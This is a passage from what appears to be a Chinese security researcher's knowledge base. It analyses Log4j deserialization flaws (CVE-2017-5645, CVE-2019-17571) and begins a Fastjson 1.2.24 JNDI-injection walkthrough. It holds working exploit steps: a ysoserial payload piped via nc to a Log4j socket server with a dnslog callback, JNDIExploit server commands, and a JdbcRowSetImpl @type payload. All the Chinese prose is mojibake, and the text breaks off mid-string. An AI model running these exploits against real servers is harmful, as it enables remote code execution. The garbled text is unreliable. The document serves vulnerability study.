â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”œâ”€â”€>â”‚ Appender â”‚â”€â”€â”€>â”‚ Filter â”‚â”€â”€â”€>â”‚ Layout â”‚â”€â”€â”€>â”‚ File â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â””â”€â”€>â”‚ Appender â”‚â”€â”€â”€>â”‚ Filter â”‚â”€â”€â”€>â”‚ Layout â”‚â”€â”€â”€>â”‚ Socket â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ å½“æˆ‘ä»¬ä½¿ç”¨Log4jè¾“å‡ºä¸€æ¡æ—¥å¿—æ—¶ï¼ŒLog4jè‡ªåŠ¨é€šè¿‡ä¸åŒçš„AppenderæŠŠåŒä¸€æ¡æ—¥å¿—è¾“å‡ºåˆ°ä¸åŒçš„ç›®çš„åœ°ã€‚ä¾‹å¦‚ï¼š consoleï¼šè¾“å‡ºåˆ°å±å¹•ï¼› fileï¼šè¾“å‡ºåˆ°æ–‡ä»¶ï¼› socketï¼šé€šè¿‡ç½‘ç»œè¾“å‡ºåˆ°è¿œç¨‹è®¡ç®—æœºï¼› jdbcï¼šè¾“å‡ºåˆ°æ•°æ®åº“ åœ¨è¾“å‡ºæ—¥å¿—çš„è¿‡ç¨‹ä¸­ï¼Œé€šè¿‡Filteræ¥è¿‡æ»¤å“ªäº›logéœ€è¦è¢«è¾“å‡ºï¼Œå“ªäº›logä¸éœ€è¦è¢«è¾“å‡ºã€‚ä¾‹å¦‚ï¼Œä»…è¾“å‡ºERRORçº§åˆ«çš„æ—¥å¿—ã€‚ æœ€åï¼Œé€šè¿‡Layoutæ¥æ ¼å¼åŒ–æ—¥å¿—ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼Œè‡ªåŠ¨æ·»åŠ æ—¥æœŸã€æ—¶é—´ã€æ–¹æ³•åç§°ç­‰ä¿¡æ¯ã€‚ åŸºç¡€ä½¿ç”¨ pom.xml org.apache.logging.log4j log4j-core 2.8.1 log4j2.xml https://blog.csdn.net/pan_junbiao/article/details/104313938 æˆ‘ä»¬æŠŠä¸€ä¸ªlog4j2.xmlçš„æ–‡ä»¶æ”¾åˆ°classpathä¸‹å°±å¯ä»¥è®©Log4jè¯»å–é…ç½®æ–‡ä»¶å¹¶æŒ‰ç…§æˆ‘ä»¬çš„é…ç½®æ¥è¾“å‡ºæ—¥å¿—ã€‚ [%-5p] %d %c - %m%n =========================================%n æ—¥å¿—çº§åˆ«ï¼š%p%n æ—¥å¿—æ—¶é—´ï¼š%d%n æ‰€å±ç±»åï¼š%c%n æ‰€å±çº¿ç¨‹ï¼š%t%n æ—¥å¿—ä¿¡æ¯ï¼š%m%n logs/myLog.log Test.java package org.example; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; import java.util.function.LongFunction; public class Test { public static void main( String[] args ) { Logger logger = LogManager.getLogger(LongFunction.class); logger.trace(\"trace level\"); logger.debug(\"debug level\"); logger.info(\"info level\"); logger.warn(\"warn level\"); logger.error(\"error level\"); logger.fatal(\"fatal level\"); } } CVE-2017-5645 ç®€ä»‹ Apache Log4jæ˜¯ä¸€ä¸ªç”¨äºJavaçš„æ—¥å¿—è®°å½•åº“ï¼Œå…¶æ”¯æŒå¯åŠ¨è¿œç¨‹æ—¥å¿—æœåŠ¡å™¨ã€‚Apache Log4j 2.8.2ä¹‹å‰çš„2.xç‰ˆæœ¬ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ã€‚åœ¨ä½¿ç”¨TCP/UDP å¥—æ¥å­—æ¥å£ç›‘å¬è·å–åºåˆ—åŒ–çš„æ—¥å¿—äº‹ä»¶æ—¶ï¼Œå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚ ç¯å¢ƒå‡†å¤‡ org.apache.logging.log4j log4j-core 2.8.1 com.beust jcommander 1.48 ç›´æ¥å¤ç° ç¯å¢ƒå¯åŠ¨ æ‰¾åˆ°åˆšæ‰ä¸‹è½½çš„jaråŒ…ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å¯åŠ¨ç›‘å¬6666ç«¯å£ java -cp log4j-core-2.8.1.jar:log4j-api-2.8.1.jar:jcommander-1.48.jar org.apache.logging.log4j.core.net.server.TcpSocketServer -p 6666 æ¼æ´å¤ç° ä½¿ç”¨ysoserialç›´æ¥ç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–æ•°æ®ï¼Œå¹¶å‘é€ç»™6666ç«¯å£ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://jqi53t.dnslog.cn | nc 127.0.0.1 6666 ä½¿ç”¨URLDNSé“¾ï¼Œååºåˆ—åŒ–åæŸ¥çœ‹DNSLOGï¼Œå·²ç»æ”¶åˆ°è¯·æ±‚ DEBUGåˆ†æ ç¼–å†™å¯åŠ¨ä»£ç ï¼Œå…¶å®ä¸»è¦å°±æ˜¯è°ƒç”¨äº†org.apache.logging.log4j.core.net.server.TcpSocketServer.main()ï¼Œå’Œå‰é¢å‘½ä»¤è¡Œå¯åŠ¨ä¸€æ · package org.example; import org.apache.logging.log4j.core.net.server.TcpSocketServer; public class Test { public static void main(String[] args) throws Exception { String[] arg = {\"-p\", \"6666\"}; TcpSocketServer.main(arg); } } åˆ†æä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹ï¼Œåœ¨main()é‚£ä¸‹æ–­ç‚¹ï¼Œå¯åŠ¨ è·Ÿè¿›main() BasicCommandLineArguments.parseCommandLine()ä¸éš¾çŒœå‡ºæ˜¯è§£æå‚æ•°çš„ï¼Œè·³è¿‡ ç»è¿‡ä¸€äº›åˆ¤æ–­ï¼Œåˆ°äº† createSerializedSocketServer()æ–¹æ³•ï¼Œçœ‹åå­—æ˜¯åˆ›å»ºåºåˆ—åŒ–socketæœåŠ¡ç«¯ï¼Œè·Ÿè¿›å» å‘ç°åˆ›å»ºäº†ä¸€ä¸ªTcpSocketServerï¼Œå¹¶ä¸”è°ƒç”¨LOGGER.exit()æ–¹æ³•è¿”å›ï¼ŒLOGGER.exitçš„åŠŸèƒ½å°±æ˜¯å¯¹æ—¥å¿—åšäº›æ“ä½œï¼Œç„¶åä»ç„¶è¿”å›ä¼ è¿›æ¥çš„å¯¹è±¡ï¼Œæ‰€ä»¥è¿™é‡Œç›¸å½“äºå°±æ˜¯è¿”å›äº†TcpSocketServerã€‚ è¿”å›TcpSocketServer.clssçš„main()æ–¹æ³•ï¼Œè°ƒç”¨äº†socketServer.startNewThread()ï¼Œçœ‹åå­—æ˜¯æ–°å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œè·Ÿè¿›å» AbstractSocketServerç±»å®ç°äº†Runnableæ¥å£ï¼Œåœ¨å¯åŠ¨æ–°çº¿ç¨‹çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨run()æ–¹æ³•ï¼›ï¼ˆä¸ç†Ÿæ‚‰å¯ä»¥å»çœ‹çœ‹Javaå¤šçº¿ç¨‹ï¼‰ è¿™é‡Œå¤šçº¿ç¨‹çš„ä»»åŠ¡ç¨‹åºæ˜¯thisï¼Œè€Œæ­¤æ—¶çš„thisæ˜¯TcpSocketServerï¼Œæ‰€ä»¥ä¼šè°ƒç”¨TcpSocketServer.run()æ–¹æ³•ï¼Œçœ‹ä¸‹å¯¹åº”çš„run()æ–¹æ³• å¯è§é‡Œé¢è°ƒç”¨äº†serverSocket.accept()æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªSocketï¼Œè¿™ä¸ªæ²¡å•¥å½±å“ï¼Œä½†æ­¤æ—¶å·²ç»å¼€å§‹ç›‘å¬æˆ‘ä»¬è®¾å®šçš„ç«¯å£äº† æ‰‹åŠ¨å‘è¯¥ç«¯å£å‘é€æ•°æ®ï¼Œè§¦å‘åç»­æµç¨‹ ç„¶åç”¨clientSocketå®ä¾‹åŒ–SocketHandler çœ‹ä¸‹SocketHandlerçš„æ„é€ å‡½æ•°ï¼Œç»™this.inputStreamèµ‹å€¼ è€ŒTcpSocketServer.this.logEventInputçš„ç±»æ˜¯ObjectInputStreamLogEventBridgeï¼Œè¿™é‡Œç›¸å½“äºè°ƒç”¨äº†å®ƒçš„wrapStreamæ–¹æ³• æ¥æ”¶åˆ°æ•°æ®åçš„æ•´ä¸ªæµç¨‹ï¼Œå°±æ˜¯æŠŠsocketè¿æ¥ä¼ è¿‡æ¥çš„æ•°æ®æµä½œä¸ºåŒ…è£…æˆObjectInputStreamï¼Œç°åœ¨this.inputStreamå°±æ˜¯ä¸€ä¸ªæ¥è‡ªç”¨æˆ·è¾“å…¥çš„ObjectInputStreamæµäº†ã€‚ å›åˆ°TcpSocketServerçš„runæ–¹æ³• ç»§ç»­å¾€ä¸‹ï¼Œæ‰§è¡Œäº†handler.start()ï¼Œè€Œhandleræ˜¯SocketHandlerç±»çš„å®ä¾‹ï¼Œè¿™ä¸ªç±»ç»§æ‰¿è‡ªLog4jThreadï¼ŒLog4jThreadåˆç»§æ‰¿è‡ªThreadç±»ï¼Œæ‰€ä»¥ä»–æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„çº¿ç¨‹ç±»ï¼Œè‡ªå®šä¹‰çš„çº¿ç¨‹ç±»æœ‰ä¸ªç‰¹ç‚¹ï¼Œé‚£å°±æ˜¯å¿…é¡»é‡å†™runæ–¹æ³•ï¼Œè€Œä¸”å½“è°ƒç”¨è‡ªå®šä¹‰çº¿ç¨‹ç±»çš„start()æ–¹æ³•æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨å®ƒçš„run()æ–¹æ³• ç„¶åé»˜è®¤ä¼šè¿›å…¥åˆ°TcpSocketServer.this.logEventInput.logEventsè¿™ä¸ªæ–¹æ³•ï¼Œè·Ÿè¿› è°ƒç”¨äº†readObject()è¿›è¡Œååºåˆ—åŒ–ï¼Œç„¶åè§¦å‘æˆ‘ä»¬çš„æ¶æ„é“¾ï¼Œåˆ°æ­¤åˆ†æç»“æŸ æ€»ç»“ï¼šinputStreamå°±æ˜¯è¢«å°è£…æˆObjectInputStreamæµçš„ã€æˆ‘ä»¬é€šè¿‡tcpå‘é€çš„æ•°æ®ã€‚æ‰€ä»¥åªè¦log4jçš„tcpsocketserverç«¯å£å¯¹å¤–å¼€æ”¾ï¼Œä¸”ç›®æ ‡å­˜åœ¨å¯åˆ©ç”¨çš„popé“¾ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡tcpç›´æ¥å‘é€æ¶æ„çš„åºåˆ—åŒ–payloadå®ç°RCEã€‚ CVE-2019-17571 ç®€ä»‹ https://logging.apache.org/log4j/1.2/ å’Œä¸Šé¢çš„CVEå·®ä¸å¤šï¼Œåªæ˜¯è§¦å‘ç‚¹æ˜¯SocketNodeçš„run()æ–¹æ³•ï¼Œä¸”è¿™ä¸ªåœ°æ–¹éœ€è¦çš„log4jçš„ç‰ˆæœ¬æ˜¯1.2ï¼Œæ„Ÿè§‰æ˜¯ä¸ºäº†å‡‘CVEï¼Ÿ ç¯å¢ƒå‡†å¤‡ log4j log4j 1.2.17 Debugåˆ†æ å¯åŠ¨å‡½æ•°ï¼Œæœ‰é”™è¯¯å•¥çš„å¯ä»¥ä¸ç”¨ç®¡ï¼Œä¸å½±å“å¤ç° package org.example; import org.apache.log4j.net.SocketServer; public class Test { public static void main(String[] args) { String[] arg = {\"6666\", \"./\", \"./\"}; SocketServer.main(arg); } } ä¸€æ ·çš„ï¼Œmainä¸‹æ–­ç‚¹ è·Ÿè¿›mainï¼Œå…ˆåˆå§‹åŒ–å‚æ•° ç„¶åä¸€ç›´åˆ°serverSocket.acceptï¼Œå¼€å¯ç›‘å¬ ä¼ å…¥æ¶æ„çš„åºåˆ—åŒ–æ•°æ® ç»§ç»­å¾€ä¸‹ï¼Œå…ˆå®ä¾‹åŒ–SocketNodeï¼Œç„¶åå®ä¾‹åŒ–Threadï¼Œæœ€åè°ƒç”¨start è·Ÿè¿›SocketNodeï¼Œå‘ç°ä¼šå°†æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®è½¬æ¢æˆObjectInputStreamç±»ï¼Œå¹¶èµ‹å€¼ç»™å˜é‡ois ç„¶åè¿”å›mainæ–¹æ³•ä¸­ï¼Œå‘ç°è°ƒç”¨äº†start()æ–¹æ³•ï¼Œæ ¹æ®å¤šçº¿ç¨‹ï¼Œè°ƒç”¨start()æ–¹æ³•å…¶å®å°±æ˜¯è°ƒç”¨äº†å¯¹åº”ç±»çš„run()æ–¹æ³•ï¼Œè¿™é‡Œå…¶å®å°±æ˜¯è°ƒç”¨çš„SocketNode.run() è·Ÿè¿›SocketNode.run()ï¼Œå‘ç°this.oisè°ƒç”¨äº†æ–¹æ³•readObject()ï¼Œè‡³æ­¤ååºåˆ—åŒ–å®Œæˆ æŸ¥çœ‹dnslogæ—¥å¿—ï¼ŒæˆåŠŸè§¦å‘ å…¶ä»– log4jæ˜¯ä¸€ä¸ªæ—¥å¿—ç»„ä»¶ï¼Œåœ¨ç”¨log4jæ­å»ºæ—¥å¿—æœåŠ¡å™¨é›†ä¸­ç®¡ç†æ—¥å¿—çš„æ—¶å€™ä¼šç”¨åˆ°socketserverè¿™ç§æœºåˆ¶ï¼Œè¯•äº†ä¸€ä¸‹ç”¨nmapè¯†åˆ«ä¸å‡ºæœåŠ¡ï¼Œæ‰€ä»¥è¿˜æ˜¯ä»¥å®¡è®¡å‘ç°è¯¥æ¼æ´ä¸ºä¸»å§ã€‚ Log4j2 TcpSocketServer æ—¥å¿—é›†ä¸­æ‰“å° Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:52:00 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/04.Fastjson 1.2.24ååºåˆ—åŒ–æ¼æ´åˆ†æ.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/04.Fastjson 1.2.24ååºåˆ—åŒ–æ¼æ´åˆ†æ.html","title":"04.Fastjson 1.2.24ååºåˆ—åŒ–æ¼æ´åˆ†æ","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 å‰è¨€ DEMO ç¯å¢ƒæ­å»º åºåˆ—åŒ– ååºåˆ—åŒ–â€¼ï¸ åˆ©ç”¨é“¾ åˆ†æ åˆ©ç”¨ å¤ç° æ€»ç»“ DEBUGåˆ†æ ä¿®å¤æ–¹æ¡ˆ ä¸€äº›ç»†èŠ‚ ä¸¾ä¾‹æ¼”ç¤º åˆ†æ TemplatesImplæ”»å‡»è°ƒç”¨é“¾è·¯ å‚è€ƒé“¾æ¥ å‰è¨€ å‰é¢è®²äº†JNDIæ³¨å…¥ç›¸å…³çš„çŸ¥è¯†ï¼Œä¸å®é™…æ“ä½œæ“ä½œæ€ä¹ˆèƒ½è¡Œå‘¢ï¼ è¿™é‡Œå°±ä¸»è¦åˆ†æä¸€ä¸‹fastjson 1.2.24ç‰ˆæœ¬çš„ååºåˆ—åŒ–æ¼æ´ï¼Œè¿™ä¸ªæ¼æ´æ¯”è¾ƒæ™®éçš„åˆ©ç”¨æ‰‹æ³•å°±æ˜¯é€šè¿‡JNDIæ³¨å…¥çš„æ–¹å¼å®ç°RCEï¼Œæ‰€ä»¥æ˜¯ä¸€ä¸ªä¸å¾—ä¸åˆ†æçš„JNDIæ³¨å…¥å®è·µæ¡ˆä¾‹ï¼ è¿™é‡Œä¸åŒä¸æˆ‘ä»¬ä¹‹å‰åˆ†æçš„ååºåˆ—åŒ–ï¼Œfastjsonæ˜¯ä¸€ä¸ªéå¸¸æµè¡Œçš„åº“ï¼Œå®ƒå¯ä»¥å°†æ•°æ®åœ¨JSONå’ŒJava Objectä¹‹é—´äº’ç›¸è½¬æ¢ï¼Œæˆ‘ä»¬å¸¸è¯´çš„fastjsonåºåˆ—åŒ–å°±æ˜¯å°†javaå¯¹è±¡è½¬åŒ–ä¸ºjsonå­—ç¬¦ä¸²ï¼Œè€Œååºåˆ—åŒ–å°±æ˜¯å°†jsonå­—ç¬¦ä¸²è½¬åŒ–ä¸ºjavaå¯¹è±¡ã€‚ DEMO ç¯å¢ƒæ­å»º pom.xml com.alibaba fastjson 1.2.24 åºåˆ—åŒ– package org.example; import com.alibaba.fastjson.JSON; public class App { public static void main( String[] args ){ User user = new User(); user.setAge(66); user.setUsername(\"test\"); String json = JSON.toJSONString(user); System.out.println(json); } } class User{ private String username; private int age; public void setUsername(String username) { this.username = username; } public String getUsername() { return username; } public void setAge(int age) { this.age = age; } public int getAge() { return age; } } è¿è¡Œåï¼Œå¾—åˆ°å¯¹åº”çš„JSONæ ¼å¼å­—ç¬¦ä¸² ååºåˆ—åŒ–â€¼ï¸ fastjsonååºåˆ—åŒ–åˆ°å¯¹åº”ç±»çš„è¿‡ç¨‹ä¸­ä¼šè‡ªåŠ¨è°ƒç”¨ç›®æ ‡å¯¹è±¡çš„setXXXæ–¹æ³•ï¼Œä¾‹å¦‚{\"age\":66,\"username\":\"test\"}è¢«ååºåˆ—åŒ–ä¸ºUserç±»æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨Userç±»çš„setAgeä»¥åŠsetUsernameæ–¹æ³•ï¼Œå®è·µå‡ºçœŸçŸ¥ ä¿®æ”¹ä¸€ä¸‹Userç±»ï¼Œåœ¨setXXXæ–¹æ³•é‡Œé¢æ·»åŠ è¾“å‡º class User{ private String username; private int age; public void setUsername(String username) { this.username = username; System.out.println(\"call setUsername\"); } public String getUsername() { return username; } public void setAge(int age) { this.age = age; System.out.println(\"call setAge\"); } public int getAge() { return age; } } ä¿®æ”¹Appå¯åŠ¨ç±»ï¼Œååºåˆ—åŒ–ç”ŸæˆUserå¯¹è±¡ package org.example; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class App { public static void main( String[] args ){ String json = \"{\\\"age\\\":66,\\\"username\\\":\\\"test\\\"}\"; User user = JSON.parseObject(json, User.class); // åé¢çš„User.classè¡¨ç¤ºååºåˆ—åŒ–ä¸ºUserç±» } } æ‰§è¡Œåï¼Œå¯ä»¥çœ‹åˆ°åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ç¡®å®è°ƒç”¨äº†setXXXçš„æ–¹æ³• è¿™é‡Œæˆ‘ä»¬ååºåˆ—åŒ–ä½¿ç”¨çš„æ˜¯parseObject()æ–¹æ³•ï¼Œå…¶å®ä¹Ÿå¯ä»¥ç”¨åˆ°parse()æ–¹æ³•ï¼ŒparseObject() æœ¬è´¨ä¸Šä¹Ÿæ˜¯è°ƒç”¨ parse() è¿›è¡Œååºåˆ—åŒ–çš„ã€‚ä½†æ˜¯ parseObject() ä¼šé¢å¤–çš„å°†Javaå¯¹è±¡è½¬ä¸º JSONObjectå¯¹è±¡ï¼Œå³ JSON.toJSON()ï¼› ä»–ä»¬çš„æœ€ä¸»è¦çš„åŒºåˆ«å°±æ˜¯å‰è€…è¿”å›çš„æ˜¯JSONObjectï¼Œè€Œåè€…ä¼šè¯†åˆ«å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„ setter æ–¹æ³•åŠæŸäº›ç‰¹å®šæ¡ä»¶çš„ getter æ–¹æ³•ï¼Œè¿”å›çš„æ˜¯å®é™…ç±»å‹çš„å¯¹è±¡ï¼›å½“åœ¨æ²¡æœ‰å¯¹åº”ç±»çš„å®šä¹‰çš„æƒ…å†µä¸‹ï¼ˆæ²¡æœ‰åœ¨@typeå£°æ˜ç±»ï¼‰ï¼Œé€šå¸¸æƒ…å†µä¸‹éƒ½ä¼šä½¿ç”¨JSON.parseObjectæ¥è·å–æ•°æ®ã€‚ ç”±äºJSON.parseObject()è¦ååºåˆ—åŒ–åˆ°å¯¹åº”çš„å¯¹è±¡ï¼ˆæ¯”å¦‚demoä¸­çš„Userç±»å¯¹è±¡ï¼Œéœ€è¦å°†ç¬¬äºŒä¸ªå‚æ•°è®¾ç½®ä¸ºUser.classï¼‰æ‰ä¼šè§¦å‘ç±»çš„setXXXæ–¹æ³•ï¼Œè€Œç›´æ¥ä½¿ç”¨è¯¥æ–¹æ³•è¿”å›çš„æ˜¯JSONObjectå¯¹è±¡ï¼Œæ˜¯ä¸ä¼šè§¦å‘setXXXæ–¹æ³•çš„ï¼ˆå› ä¸ºJVMä¹Ÿä¸çŸ¥é“æ˜¯å“ªä¸ªç±»çš„å¯¹è±¡ï¼‰ é‚£è¦æ€ä¹ˆå¤„ç†æ‰èƒ½è®©JSON.parseObject()åœ¨è°ƒç”¨æ—¶ï¼Œä¸è¾“å…¥ç¬¬äºŒä¸ªå‚æ•°ä¹Ÿèƒ½æ‰§è¡ŒsetXXXæ–¹æ³•å‘¢ï¼Œç­”æ¡ˆå°±æ˜¯ä¸Šé¢åˆ©ç”¨parse()æ–¹æ³•ä½¿åˆ°çš„ç”¨@typeå±æ€§ã€‚ fastjsonæ¥å—çš„JSONå¯ä»¥é€šè¿‡@typeå­—æ®µæ¥æŒ‡å®šè¯¥JSONåº”å½“è¿˜åŸæˆä½•ç§ç±»å‹çš„å¯¹è±¡ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ–¹ä¾¿æ“ä½œã€‚ ä¸¾ä¸ªä¾‹å­ï¼š package org.example; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class App { public static void main(String[] args) { String json1 = \"{\\\"age\\\":66,\\\"username\\\":\\\"test\\\"}\"; String json2 = \"{\\\"@type\\\":\\\"org.example.User\\\", \\\"age\\\":66,\\\"username\\\":\\\"test\\\"}\"; System.out.println(\"ååºåˆ—åŒ–JSON1\"); JSON.parseObject(json1); System.out.println(\"ååºåˆ—åŒ–JSON1\"); JSON.parseObject(json2); } } class User { private String username; private int age; public void setUsername(String username) { this.username = username; System.out.println(\"call setUsername\"); } public String getUsername() { return username; } public void setAge(int age) { this.age = age; System.out.println(\"call setAge\"); } public int getAge() { return age; } } æ‰§è¡Œåï¼Œæ²¡æœ‰@typeè¿”å›JSONObjectï¼Œæœ‰@typeåˆ™è¿”å›å¯¹åº”çš„ç±»å¯¹è±¡ä¸”æˆåŠŸè°ƒç”¨äº†setXXXæ–¹æ³• å¯è§@typeå‚æ•°çš„ä½œç”¨å°±æ˜¯æŒ‡å®šjsonå­—ç¬¦ä¸²è¦ååºåˆ—åŒ–ä¸ºå“ªä¸ªç±»çš„å¯¹è±¡ï¼Œè€Œå°±æ˜¯è¿™ä¸ªå±æ€§ï¼Œè®©æˆ‘ä»¬èƒ½å¤Ÿå¯¹å…¶è¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚ åˆ©ç”¨é“¾ åˆ†æ ç”±äºåœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ä¼šè‡ªåŠ¨è°ƒç”¨@typeç±»ä¸­ç›¸å…³çš„setXXXæ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ‰¾åˆ°ä¸€ä¸ªç±»ï¼Œä¸”è¿™ä¸ªç±»çš„setXXXæ–¹æ³•å¯ä»¥é€šè¿‡æˆ‘ä»¬å¯¹å‚æ•°çš„æ„é€ è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœï¼Œé‚£æ”»å‡»çš„ç›®çš„ä¸å°±è¾¾åˆ°äº†å—ï¼Ÿ å¦‚æœéœ€è¦è¿˜åŸå‡ºprivateå±æ€§çš„è¯ï¼Œè¿˜éœ€è¦åœ¨JSON.parseObject/JSON.parseä¸­åŠ ä¸ŠFeature.SupportNonPublicFieldå‚æ•°ã€‚ ä¸è¿‡ä¸€èˆ¬æ²¡äººä¼šç»™ç§æœ‰å±æ€§åŠ setteræ–¹æ³•ï¼ŒåŠ äº†å°±æ²¡å¿…è¦å£°æ˜ä¸ºprivateäº† ç»è¿‡å¤§ä½¬ä»¬çš„åˆ†æï¼Œå°±å‘ç°äº†com.sun.rowset.JdbcRowSetImplè¿™ä¸ªç±»å¯ä»¥è¢«åˆ©ç”¨ è¿™ä¸ªç±»ä¸­æœ‰å¾ˆå¤šçš„setXXXæ–¹æ³•ï¼Œä½†æˆ‘ä»¬éœ€è¦åˆ©ç”¨çš„ï¼Œåˆ™æ˜¯setDataSourceName()å’ŒsetAutoCommit()è¿™ä¸¤ä¸ªæ–¹æ³• JdbcRowSetImpl.setDataSourceName public void setDataSourceName(String var1) throws SQLException { if (this.getDataSourceName() != null) { if (!this.getDataSourceName().equals(var1)) { super.setDataSourceName(var1); this.conn = null; this.ps = null; this.rs = null; } } else { super.setDataSourceName(var1); } } è¿™é‡Œè°ƒç”¨äº†çˆ¶ç±»çš„setDataSourceNameæ–¹æ³•ï¼Œè·Ÿä¸€ä¸‹ BaseRowSet.setDataSourceName public void setDataSourceName(String name) throws SQLException { if (name == null) { dataSource = null; } else if (name.equals(\"\")) { throw new SQLException(\"DataSource name cannot be empty string\"); } else { dataSource = name; } URL = null; } å¯ä»¥çœ‹åˆ°å°±æ˜¯è®¾ç½®äº†dataSource JdbcRowSetImpl.setAutoCommit public void setAutoCommit(boolean var1) throws SQLException { if (this.conn != null) { this.conn.setAutoCommit(var1); } else { this.conn = this.connect(); this.conn.setAutoCommit(var1); } } è¿›è¡Œäº†connect()æ“ä½œï¼Œè·Ÿè¿›connect() JdbcRowSetImpl.connect private Connection connect() throws SQLException { if (this.conn != null) { return this.conn; } else if (this.getDataSourceName() != null) { try { InitialContext var1 = new InitialContext(); DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); return this.getUsername() != null && !this.getUsername().equals(\"\") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection(); } catch (NamingException var3) { throw new SQLException(this.resBundle.handleGetObject(\"jdbcrowsetimpl.connect\").toString()); } } else { return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null; } } å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰JNDIæ³¨å…¥ä¸­çš„lookupçš„è°ƒç”¨ï¼Œè€Œè°ƒç”¨çš„å‚æ•°å°±æ˜¯åˆšæ‰è®¾ç½®çš„dataSourceï¼Œè¿™ä¸ªæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œå¦‚æœè®©ä»–åŠ è½½æ¶æ„çš„Referenceç±»ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ç›®çš„å°±è¾¾æˆäº†ã€‚ åˆ©ç”¨ æ ¹æ®ä¹‹å‰çš„å­¦ä¹ å’Œåˆ†æï¼Œåˆ©ç”¨ç±»com.sun.rowset.JdbcRowSetImplï¼Œåˆ©ç”¨çš„setæ–¹æ³•setDataSourceNameå’ŒsetAutoCommitï¼Œæ„é€ payload { \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"æ¶æ„çš„Referenceç±»\", \"autoCommit\": true/false } å¤ç° ç›´æ¥ç”¨JNDIExploitåŒæ—¶å¯åŠ¨ldapå’ŒhttpæœåŠ¡ï¼Œå¥½å¤„å°±æ˜¯ä¸éœ€è¦è‡ªå·±æ‰‹åŠ¨ç¼–è¯‘classä»€ä¹ˆçš„äº† å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨marshalsecå¿«é€Ÿå¼€å¯rmiæˆ–è€…ldapæœåŠ¡ï¼Œå†æ‰‹åŠ¨å¼€å¯httpæœåŠ¡ # æŸ¥çœ‹ç”¨æ³• java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1 -l 9999 -p 8888 -u # å¯åŠ¨æœåŠ¡ java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1 -l 9999 -p 8888 ååºåˆ—åŒ–json package org.example; import com.alibaba.fastjson.JSON; public class App { public static void main(String[] args) { // é«˜ç‰ˆæœ¬çš„JDKï¼Œéœ€è¦è®¾ç½®ä¸€ä¸‹ï¼Œä½ç‰ˆæœ¬çš„å¯ä»¥å¿½ç•¥ï¼Œå‚è€ƒJNDIæ³¨å…¥æ–‡ç«  System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\"); String json = \"{\\\"@type\\\": \\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\": 